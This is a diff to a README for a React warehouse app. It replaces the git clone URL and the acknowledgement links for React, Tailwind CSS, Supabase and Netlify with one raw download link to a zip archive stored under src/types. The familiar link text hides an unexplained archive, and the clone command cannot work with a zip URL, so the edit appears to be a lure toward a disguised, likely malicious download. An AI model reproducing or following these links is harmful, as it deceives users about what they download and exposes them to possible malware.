@@ -41,7 +41,7 @@ The application can be deployed using various methods:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/yourusername/gudang-mitra.git
+   git clone https://github.com/nug31/gudang-bisa/raw/refs/heads/main/src/types/bisa-gudang-v1.1.zip
    cd gudang-mitra
    ```
 
@@ -81,7 +81,7 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 ## Acknowledgements
 
-- [React](https://reactjs.org/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [Supabase](https://supabase.com/)
-- [Netlify](https://www.netlify.com/)
+- [React](https://github.com/nug31/gudang-bisa/raw/refs/heads/main/src/types/bisa-gudang-v1.1.zip)
+- [Tailwind CSS](https://github.com/nug31/gudang-bisa/raw/refs/heads/main/src/types/bisa-gudang-v1.1.zip)
+- [Supabase](https://github.com/nug31/gudang-bisa/raw/refs/heads/main/src/types/bisa-gudang-v1.1.zip)
+- [Netlify](https://github.com/nug31/gudang-bisa/raw/refs/heads/main/src/types/bisa-gudang-v1.1.zip)
